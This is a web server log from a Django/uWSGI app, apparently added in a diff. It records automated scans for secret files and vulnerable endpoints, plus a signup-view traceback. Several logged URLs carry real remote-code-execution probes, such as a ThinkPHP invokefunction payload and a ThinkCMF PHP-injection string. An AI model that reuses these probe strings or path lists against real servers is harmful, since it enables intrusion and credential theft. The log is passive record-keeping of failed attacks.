+[pid: 10|app: 0|req: 54/54] 35.165.191.186 () {36 vars in 512 bytes} [Mon Mar 22 14:57:01 2021] GET /.env => generated 2715 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 10|app: 0|req: 55/55] 35.165.191.186 () {40 vars in 619 bytes} [Mon Mar 22 14:57:02 2021] POST / => generated 2686 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 10|app: 0|req: 56/56] 149.28.117.83 () {36 vars in 417 bytes} [Mon Mar 22 14:57:45 2021] GET /.env => generated 2715 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /vendor/phpunit/phpunit/phpunit.xml
+[pid: 10|app: 0|req: 57/57] 149.28.117.83 () {36 vars in 477 bytes} [Mon Mar 22 14:57:47 2021] GET /vendor/phpunit/phpunit/phpunit.xml => generated 2805 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 58/58] 175.203.81.8 () {44 vars in 879 bytes} [Mon Mar 22 15:11:48 2021] GET /swagger/ => generated 2232 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 59/59] 175.203.81.8 () {44 vars in 860 bytes} [Mon Mar 22 15:11:50 2021] GET /swagger/?format=openapi => generated 3759 bytes in 8 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 60/60] 23.22.16.221 () {36 vars in 482 bytes} [Mon Mar 22 15:11:51 2021] GET /swagger/?format=openapi => generated 3759 bytes in 9 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 1)
+Not Found: /
+[pid: 10|app: 0|req: 61/61] 103.145.13.24 () {28 vars in 295 bytes} [Mon Mar 22 15:26:09 2021] GET / => generated 2685 bytes in 4 msecs (HTTP/1.0 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 10|app: 0|req: 62/62] 192.241.218.24 () {34 vars in 382 bytes} [Mon Mar 22 15:29:47 2021] GET / => generated 2685 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /boaform/admin/formLogin
+[pid: 10|app: 0|req: 63/63] 209.141.33.74 () {48 vars in 860 bytes} [Mon Mar 22 15:45:03 2021] POST /boaform/admin/formLogin => generated 2776 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 10|app: 0|req: 64/64] 196.65.247.125 () {36 vars in 512 bytes} [Mon Mar 22 16:36:36 2021] GET /.env => generated 2715 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 10|app: 0|req: 65/65] 196.65.247.125 () {40 vars in 619 bytes} [Mon Mar 22 16:36:37 2021] POST / => generated 2686 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 10|app: 0|req: 66/66] 103.145.13.24 () {28 vars in 295 bytes} [Mon Mar 22 17:19:05 2021] GET / => generated 2685 bytes in 4 msecs (HTTP/1.0 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /api/jsonws/invoke
+[pid: 10|app: 0|req: 67/67] 45.146.165.157 () {38 vars in 598 bytes} [Mon Mar 22 17:29:31 2021] POST /api/jsonws/invoke => generated 2758 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[pid: 10|app: 0|req: 68/68] 45.146.165.157 () {38 vars in 700 bytes} [Mon Mar 22 17:29:31 2021] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 2857 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[pid: 10|app: 0|req: 69/69] 45.146.165.157 () {36 vars in 612 bytes} [Mon Mar 22 17:29:31 2021] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 2856 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /solr/admin/info/system
+[pid: 10|app: 0|req: 70/70] 45.146.165.157 () {34 vars in 544 bytes} [Mon Mar 22 17:29:31 2021] GET /solr/admin/info/system?wt=json => generated 2780 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /index.php
+[pid: 10|app: 0|req: 71/71] 45.146.165.157 () {34 vars in 708 bytes} [Mon Mar 22 17:29:32 2021] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 => generated 2852 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 10|app: 0|req: 72/72] 45.146.165.157 () {36 vars in 641 bytes} [Mon Mar 22 17:29:32 2021] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 2752 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 10|app: 0|req: 73/73] 45.146.165.157 () {34 vars in 544 bytes} [Mon Mar 22 17:29:32 2021] GET /?XDEBUG_SESSION_START=phpstorm => generated 2718 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /wp-content/plugins/wp-file-manager/readme.txt
+[pid: 10|app: 0|req: 74/74] 45.146.165.157 () {34 vars in 575 bytes} [Mon Mar 22 17:29:32 2021] GET /wp-content/plugins/wp-file-manager/readme.txt => generated 2841 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /console/
+[pid: 10|app: 0|req: 75/75] 45.146.165.157 () {34 vars in 501 bytes} [Mon Mar 22 17:29:33 2021] GET /console/ => generated 2730 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /Autodiscover/Autodiscover.xml
+[pid: 10|app: 0|req: 76/76] 45.146.165.157 () {38 vars in 624 bytes} [Mon Mar 22 17:29:33 2021] POST /Autodiscover/Autodiscover.xml => generated 2794 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /_ignition/execute-solution
+[pid: 10|app: 0|req: 77/77] 45.146.165.157 () {36 vars in 590 bytes} [Mon Mar 22 17:29:34 2021] GET /_ignition/execute-solution => generated 2784 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 10|app: 0|req: 78/78] 161.35.8.235 () {36 vars in 511 bytes} [Mon Mar 22 17:35:57 2021] GET / => generated 2685 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /favicon.ico
+[pid: 10|app: 0|req: 79/79] 161.35.8.235 () {36 vars in 533 bytes} [Mon Mar 22 17:35:58 2021] GET /favicon.ico => generated 2736 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 10|app: 0|req: 80/80] 193.118.53.210 () {34 vars in 476 bytes} [Mon Mar 22 18:27:49 2021] GET / => generated 2685 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /bag2
+[pid: 10|app: 0|req: 81/81] 139.162.145.250 () {34 vars in 433 bytes} [Mon Mar 22 18:47:15 2021] GET /bag2 => generated 2715 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 10|app: 0|req: 82/82] 150.136.75.66 () {36 vars in 511 bytes} [Mon Mar 22 18:49:34 2021] GET /.env => generated 2715 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 10|app: 0|req: 83/83] 150.136.75.66 () {40 vars in 618 bytes} [Mon Mar 22 18:49:36 2021] POST / => generated 2686 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 10|app: 0|req: 84/84] 89.40.73.237 () {36 vars in 503 bytes} [Mon Mar 22 19:13:17 2021] GET / => generated 2685 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 10|app: 0|req: 85/85] 143.198.239.208 () {36 vars in 543 bytes} [Mon Mar 22 20:10:15 2021] GET /.env => generated 2715 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 10|app: 0|req: 86/86] 143.198.239.208 () {40 vars in 650 bytes} [Mon Mar 22 20:10:15 2021] POST / => generated 2686 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 87/87] 211.176.125.70 () {40 vars in 784 bytes} [Mon Mar 22 20:25:47 2021] GET /swagger => generated 0 bytes in 1 msecs (HTTP/1.0 301) 6 headers in 191 bytes (1 switches on core 0)
+Not Acceptable: /swagger/
+[pid: 10|app: 0|req: 88/88] 211.176.125.70 () {40 vars in 815 bytes} [Mon Mar 22 20:35:48 2021] GET /swagger/?format=openapi => generated 18 bytes in 2 msecs (HTTP/1.0 406) 7 headers in 234 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 10|app: 0|req: 89/89] 89.45.4.189 () {36 vars in 509 bytes} [Mon Mar 22 21:02:18 2021] GET /.env => generated 2715 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 10|app: 0|req: 90/90] 89.45.4.189 () {40 vars in 616 bytes} [Mon Mar 22 21:02:18 2021] POST / => generated 2686 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 10|app: 0|req: 91/91] 103.145.13.149 () {36 vars in 520 bytes} [Mon Mar 22 21:49:49 2021] GET /.env => generated 2715 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 10|app: 0|req: 92/92] 139.59.69.194 () {26 vars in 271 bytes} [Mon Mar 22 22:53:54 2021] GET / => generated 2683 bytes in 4 msecs (HTTP/1.0 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 10|app: 0|req: 93/93] 45.134.225.209 () {40 vars in 617 bytes} [Mon Mar 22 22:59:40 2021] GET / => generated 2688 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 10|app: 0|req: 94/94] 105.159.3.195 () {36 vars in 511 bytes} [Mon Mar 22 23:00:53 2021] GET /.env => generated 2715 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 10|app: 0|req: 95/95] 105.159.3.195 () {40 vars in 618 bytes} [Mon Mar 22 23:00:53 2021] POST / => generated 2686 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 96/96] 222.107.238.18 () {42 vars in 896 bytes} [Tue Mar 23 00:20:29 2021] GET /swagger/ => generated 2232 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 97/97] 222.107.238.18 () {44 vars in 984 bytes} [Tue Mar 23 00:20:30 2021] GET /swagger/?format=openapi => generated 3759 bytes in 8 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 98/98] 23.22.16.221 () {36 vars in 482 bytes} [Tue Mar 23 00:20:31 2021] GET /swagger/?format=openapi => generated 3759 bytes in 9 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 1)
+Not Found: /
+[pid: 10|app: 0|req: 99/99] 222.114.171.28 () {42 vars in 842 bytes} [Tue Mar 23 00:22:59 2021] GET / => generated 2691 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /robots.txt
+[pid: 10|app: 0|req: 100/100] 222.114.171.28 () {38 vars in 633 bytes} [Tue Mar 23 00:23:01 2021] GET /robots.txt?1616458981739 => generated 2753 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /favicon.ico
+[pid: 10|app: 0|req: 101/101] 222.114.171.28 () {42 vars in 799 bytes} [Tue Mar 23 00:23:01 2021] GET /favicon.ico => generated 2742 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 10|app: 0|req: 102/102] 202.152.77.202 () {36 vars in 512 bytes} [Tue Mar 23 00:36:04 2021] GET /.env => generated 2715 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 10|app: 0|req: 103/103] 202.152.77.202 () {40 vars in 619 bytes} [Tue Mar 23 00:36:04 2021] POST / => generated 2686 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /robots.txt
+[pid: 10|app: 0|req: 104/104] 104.131.18.197 () {26 vars in 293 bytes} [Tue Mar 23 00:46:05 2021] HEAD /robots.txt => generated 2732 bytes in 4 msecs (HTTP/1.0 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 10|app: 0|req: 105/105] 45.134.225.209 () {40 vars in 617 bytes} [Tue Mar 23 00:55:13 2021] GET / => generated 2688 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 10|app: 0|req: 106/106] 140.119.163.66 () {34 vars in 382 bytes} [Tue Mar 23 02:17:35 2021] GET / => generated 2685 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 10|app: 0|req: 107/107] 164.52.24.163 () {36 vars in 548 bytes} [Tue Mar 23 02:35:36 2021] GET / => generated 2688 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 10|app: 0|req: 108/108] 3.12.36.4 () {36 vars in 507 bytes} [Tue Mar 23 02:38:54 2021] GET /.env => generated 2715 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 10|app: 0|req: 109/109] 3.12.36.4 () {40 vars in 614 bytes} [Tue Mar 23 02:38:55 2021] POST / => generated 2686 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+Not Found: /robots.txt
+[pid: 10|app: 0|req: 111/110] 59.26.12.201 () {40 vars in 743 bytes} [Tue Mar 23 02:48:04 2021] GET / => generated 2691 bytes in 8 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 111/111] 59.26.12.201 () {38 vars in 596 bytes} [Tue Mar 23 02:48:04 2021] GET /robots.txt => generated 2739 bytes in 8 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 10|app: 0|req: 112/112] 59.26.12.201 () {40 vars in 700 bytes} [Tue Mar 23 02:48:05 2021] GET /favicon.ico => generated 2742 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 10|app: 0|req: 113/113] 75.119.141.119 () {36 vars in 512 bytes} [Tue Mar 23 03:42:03 2021] GET /.env => generated 2715 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 10|app: 0|req: 114/114] 75.119.141.119 () {40 vars in 619 bytes} [Tue Mar 23 03:42:03 2021] POST / => generated 2686 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 10|app: 0|req: 115/115] 175.203.81.8 () {44 vars in 856 bytes} [Tue Mar 23 04:59:38 2021] GET / => generated 2691 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 10|app: 0|req: 116/116] 175.203.81.8 () {42 vars in 789 bytes} [Tue Mar 23 04:59:39 2021] GET /favicon.ico => generated 2742 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 10|app: 0|req: 117/117] 221.145.194.16 () {40 vars in 733 bytes} [Tue Mar 23 05:00:07 2021] GET / => generated 2691 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 10|app: 0|req: 118/118] 221.145.194.16 () {40 vars in 690 bytes} [Tue Mar 23 05:00:08 2021] GET /favicon.ico => generated 2742 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 10|app: 0|req: 119/119] 221.145.194.16 () {44 vars in 811 bytes} [Tue Mar 23 05:00:08 2021] GET / => generated 2691 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 120/120] 175.203.81.8 () {44 vars in 868 bytes} [Tue Mar 23 05:00:10 2021] GET /admin/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 9 headers in 339 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 121/121] 175.203.81.8 () {44 vars in 905 bytes} [Tue Mar 23 05:00:10 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 13 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 0)
+Not Found: /accounts/
+[pid: 10|app: 0|req: 122/122] 175.203.81.8 () {42 vars in 850 bytes} [Tue Mar 23 05:00:12 2021] GET /accounts/ => generated 4195 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /account
+[pid: 10|app: 0|req: 123/123] 221.145.194.16 () {40 vars in 747 bytes} [Tue Mar 23 05:00:15 2021] GET /account => generated 2730 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 124/124] 175.203.81.8 () {42 vars in 862 bytes} [Tue Mar 23 05:00:15 2021] GET /accounts/signup => generated 0 bytes in 1 msecs (HTTP/1.1 301) 6 headers in 199 bytes (1 switches on core 1)
+Method Not Allowed: /accounts/signup/
+[pid: 10|app: 0|req: 125/125] 175.203.81.8 () {42 vars in 864 bytes} [Tue Mar 23 05:00:15 2021] GET /accounts/signup/ => generated 5602 bytes in 17 msecs (HTTP/1.1 405) 8 headers in 403 bytes (1 switches on core 0)
+Not Found: /accounts/
+[pid: 10|app: 0|req: 126/126] 221.145.194.16 () {40 vars in 751 bytes} [Tue Mar 23 05:00:19 2021] GET /accounts/ => generated 4195 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Method Not Allowed: /accounts/signup/
+[pid: 10|app: 0|req: 127/127] 221.145.194.16 () {40 vars in 765 bytes} [Tue Mar 23 05:00:24 2021] GET /accounts/signup/ => generated 5602 bytes in 16 msecs (HTTP/1.1 405) 8 headers in 403 bytes (1 switches on core 0)
+Not Found: /accounts/
+[pid: 10|app: 0|req: 128/128] 221.145.194.16 () {42 vars in 840 bytes} [Tue Mar 23 05:00:39 2021] GET /accounts/ => generated 4195 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 129/129] 221.145.194.16 () {42 vars in 852 bytes} [Tue Mar 23 05:11:49 2021] GET /accounts/signup => generated 0 bytes in 1 msecs (HTTP/1.1 301) 6 headers in 199 bytes (1 switches on core 0)
+Method Not Allowed: /accounts/signup/
+[pid: 10|app: 0|req: 130/130] 221.145.194.16 () {42 vars in 854 bytes} [Tue Mar 23 05:11:49 2021] GET /accounts/signup/ => generated 5602 bytes in 15 msecs (HTTP/1.1 405) 8 headers in 403 bytes (1 switches on core 1)
+Bad Request: /accounts/signup/
+[pid: 10|app: 0|req: 131/131] 221.145.194.16 () {52 vars in 1009 bytes} [Tue Mar 23 05:12:03 2021] POST /accounts/signup/ => generated 5623 bytes in 15 msecs (HTTP/1.1 400) 8 headers in 396 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 132/132] 221.145.194.16 () {48 vars in 961 bytes} [Tue Mar 23 05:12:12 2021] OPTIONS /accounts/signup/ => generated 5868 bytes in 16 msecs (HTTP/1.1 200) 8 headers in 387 bytes (1 switches on core 1)
+Method Not Allowed: /accounts/signup/
+[pid: 10|app: 0|req: 133/133] 221.145.194.16 () {42 vars in 854 bytes} [Tue Mar 23 05:13:44 2021] GET /accounts/signup/ => generated 5602 bytes in 15 msecs (HTTP/1.1 405) 8 headers in 403 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 134/134] 221.145.194.16 () {48 vars in 961 bytes} [Tue Mar 23 05:13:50 2021] OPTIONS /accounts/signup/ => generated 5868 bytes in 15 msecs (HTTP/1.1 200) 8 headers in 387 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 135/135] 1.245.233.122 () {42 vars in 849 bytes} [Tue Mar 23 05:17:54 2021] GET /swagger/ => generated 2232 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 136/136] 1.245.233.122 () {44 vars in 861 bytes} [Tue Mar 23 05:17:55 2021] GET /swagger/?format=openapi => generated 3759 bytes in 9 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 137/137] 23.22.16.221 () {36 vars in 482 bytes} [Tue Mar 23 05:17:56 2021] GET /swagger/?format=openapi => generated 3759 bytes in 9 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 138/138] 1.245.233.122 () {42 vars in 849 bytes} [Tue Mar 23 05:18:00 2021] GET /swagger/ => generated 2232 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 139/139] 1.245.233.122 () {44 vars in 861 bytes} [Tue Mar 23 05:18:01 2021] GET /swagger/?format=openapi => generated 3759 bytes in 8 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 140/140] 23.22.16.221 () {36 vars in 482 bytes} [Tue Mar 23 05:18:01 2021] GET /swagger/?format=openapi => generated 3759 bytes in 8 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 1)
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[pid: 10|app: 0|req: 141/141] 3.235.135.153 () {34 vars in 595 bytes} [Tue Mar 23 05:46:25 2021] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 2854 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Bad Request: /accounts/signup/
+[pid: 10|app: 0|req: 142/142] 221.145.194.16 () {42 vars in 732 bytes} [Tue Mar 23 05:52:10 2021] POST /accounts/signup/ => generated 91 bytes in 2 msecs (HTTP/1.1 400) 7 headers in 218 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 143/143] 221.145.194.16 () {42 vars in 732 bytes} [Tue Mar 23 05:52:20 2021] POST /accounts/signup/ => generated 196 bytes in 407 msecs (HTTP/1.1 201) 7 headers in 215 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 144/144] 221.145.194.16 () {38 vars in 607 bytes} [Tue Mar 23 05:57:15 2021] POST /accounts/signup/ => generated 196 bytes in 321 msecs (HTTP/1.1 201) 7 headers in 215 bytes (1 switches on core 1)
+Internal Server Error: /accounts/signup/
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib/python3.8/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/usr/local/lib/python3.8/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/django/views/generic/base.py", line 70, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 509, in dispatch
+    response = self.handle_exception(exc)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 469, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
+    raise exc
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 506, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/decorators.py", line 50, in handler
+    return func(*args, **kwargs)
+  File "./Accounts/views.py", line 90, in signup
+    token = obtain_jwt_token(request._request).data['token']
+  File "/usr/local/lib/python3.8/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/django/views/generic/base.py", line 70, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 509, in dispatch
+    response = self.handle_exception(exc)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 469, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
+    raise exc
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 506, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework_jwt/views.py", line 55, in post
+    serializer = self.get_serializer(data=request.data)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/request.py", line 216, in data
+    self._load_data_and_files()
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/request.py", line 279, in _load_data_and_files
+    self._data, self._files = self._parse()
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/request.py", line 329, in _parse
+    stream = self.stream
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/request.py", line 203, in stream
+    self._load_stream()
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/request.py", line 309, in _load_stream
+    self._stream = io.BytesIO(self.body)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/request.py", line 416, in __getattr__
+    return getattr(self._request, attr)
+  File "/usr/local/lib/python3.8/site-packages/django/http/request.py", line 316, in body
+    raise RawPostDataException("You cannot access body after reading from request's data stream")
+django.http.request.RawPostDataException: You cannot access body after reading from request's data stream
+[pid: 10|app: 0|req: 145/145] 221.145.194.16 () {40 vars in 583 bytes} [Tue Mar 23 06:14:11 2021] POST /accounts/signup/ => generated 146533 bytes in 283 msecs (HTTP/1.1 500) 6 headers in 195 bytes (1 switches on core 0)
+Bad Request: /accounts/signup/
+[pid: 10|app: 0|req: 146/146] 221.145.194.16 () {40 vars in 583 bytes} [Tue Mar 23 06:14:36 2021] POST /accounts/signup/ => generated 58 bytes in 9 msecs (HTTP/1.1 400) 7 headers in 218 bytes (1 switches on core 1)
+Internal Server Error: /accounts/signup/
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib/python3.8/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/usr/local/lib/python3.8/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/django/views/generic/base.py", line 70, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 509, in dispatch
+    response = self.handle_exception(exc)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 469, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
+    raise exc
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 506, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/decorators.py", line 50, in handler
+    return func(*args, **kwargs)
+  File "./Accounts/views.py", line 90, in signup
+    token = obtain_jwt_token(request._request).data['token']
+  File "/usr/local/lib/python3.8/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/django/views/generic/base.py", line 70, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 509, in dispatch
+    response = self.handle_exception(exc)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 469, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
+    raise exc
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 506, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework_jwt/views.py", line 55, in post
